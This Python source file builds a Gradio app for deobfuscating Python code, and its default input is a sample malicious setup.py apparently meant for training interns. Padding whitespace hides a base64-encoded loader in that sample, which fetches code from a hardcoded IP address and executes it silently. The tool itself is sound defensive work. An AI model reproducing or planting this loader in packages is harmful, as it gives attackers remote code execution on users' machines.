import re
from difflib import Differ

import gradio as gr

###from app.enable_pycdc import enable_pycdc
from app.generic_obfuscation_ast import deob

PT_START_DEOBF = """### Тестовая деобфускация для удобства стажёров.
### Удачи)))

import os                                                                                                                                                                                                                                                               ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjI0LjIuMjEzLy9pbmplY3QvY3RFNnRvTERvSEJiSkFwaicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
from setuptools import setup  # type: ignore[import]

setup()

"""


def tokenize(text):
    # Split the text into words
    words = re.findall(r"\w+|\s+", text)
    tokens = []
    for word in words:
        if word.isspace():
            tokens.append((" ", " "))
        else:
            tokens.append((word, word))
    return tokens


def diff_texts(text1, text2):
    d = Differ()
    words1 = [t + "\n" for t in text1.split("\n")]
    words2 = [t + "\n" for t in text2.split("\n")]
    # Comparing the lists of words
    result = list(d.compare(words1, words2))

    # Formatting the output
    formatted_result = []
    for token in result:
        if token.startswith("- "):
            formatted_result.append((token[2:], "-"))
        elif token.startswith("+ "):
            formatted_result.append((token[2:], "+"))
        elif token.startswith("  "):
            formatted_result.append((token[2:], None))

    return formatted_result


def gradio_deob(source):
    ast_before, ast_after, unparse_before, unparse_after, deobfuscation_message = deob(
        source
    )
    diff = ""
    # diff = diff_texts(ast_before, ast_after)
    return diff, unparse_after, deobfuscation_message.value, ast_before, ast_after


def app():
    with gr.Blocks() as demo:
        code = gr.Code(
            lines=5, language="python", label="Input code", value=PT_START_DEOBF
        )
        greet_btn = gr.Button("Deobfuscate!")
        deobf_status = gr.Markdown("(deobfuscation status)")
        deobfed = gr.Code(language="python", label="AST Deobfed")
        with gr.Row():
            ast_before = gr.Code(language="python", label="AST before")
            ast_after = gr.Code(language="python", label="AST after")
        ast_transformation = gr.HighlightedText(
            label="AST Transformation",
            combine_adjacent=True,
            show_legend=True,
            color_map={"+": "green", "-": "red"},
        )
        greet_btn.click(
            fn=gradio_deob,
            inputs=code,
            outputs=[ast_transformation, deobfed, deobf_status, ast_before, ast_after],
            api_name="disassembly",
        )

    demo.launch(server_port=9999)


if __name__ == "__main__":
    #enable_pycdc()
    app()
